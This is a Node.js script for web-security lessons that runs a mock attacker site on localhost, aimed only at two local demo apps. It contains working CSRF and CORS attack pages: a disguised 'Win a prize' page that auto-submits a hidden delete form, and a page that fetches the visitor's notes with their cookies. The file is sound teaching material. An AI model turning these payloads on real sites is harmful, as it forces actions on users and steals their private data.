// A pretend attacker's website for the CSRF and CORS lessons. It listens on 127.0.0.1 only.
// Open it as http://127.0.0.1:18490 (a different site from localhost) or
// http://localhost:18490 (the same site as the app, on another port).
// Usage: node attacker-site.mjs   then add ?t=http://localhost:18402 to aim a page at the fixed app
import http from 'node:http';

const pages = (target) => ({
  // CSRF: a hidden form that posts to the app as soon as the page loads.
  '/csrf.html': `<!doctype html><title>Win a prize</title>
    <h1>Loading your prize...</h1>
    <form id="f" method="post" action="${target}/notes/2/delete"></form>
    <script>document.getElementById('f').submit();</script>`,
  // CORS: read the victim's notes with their cookie and show what came back.
  '/cors.html': `<!doctype html><title>Totally normal page</title>
    <style>body{font:15px Segoe UI,Arial,sans-serif;margin:24px} pre{background:#f8d4d4;padding:12px;white-space:pre-wrap}</style>
    <h1>Attacker page on <span id="origin"></span></h1>
    <p>It asked ${target}/api/notes for the visitor's notes, with credentials:</p>
    <pre id="out">waiting...</pre>
    <script>
      document.getElementById('origin').textContent = location.origin;
      fetch('${target}/api/notes', { credentials: 'include' })
        .then(async (r) => { document.getElementById('out').textContent = r.status + ' ' + await r.text(); })
        .catch((e) => { document.getElementById('out').textContent = 'blocked: ' + e.message; });
    </script>`,
});
http.createServer((req, res) => {
  const url = new URL(req.url, 'http://x');
  const target = url.searchParams.get('t') ?? 'http://localhost:18401';
  const page = ['http://localhost:18401', 'http://localhost:18402'].includes(target) ? pages(target)[url.pathname] : undefined;
  res.writeHead(page ? 200 : 404, { 'Content-Type': 'text/html; charset=utf-8' });
  res.end(page ?? 'not found');
}).listen(18490, '127.0.0.1', () => console.log('attacker site on http://127.0.0.1:18490'));
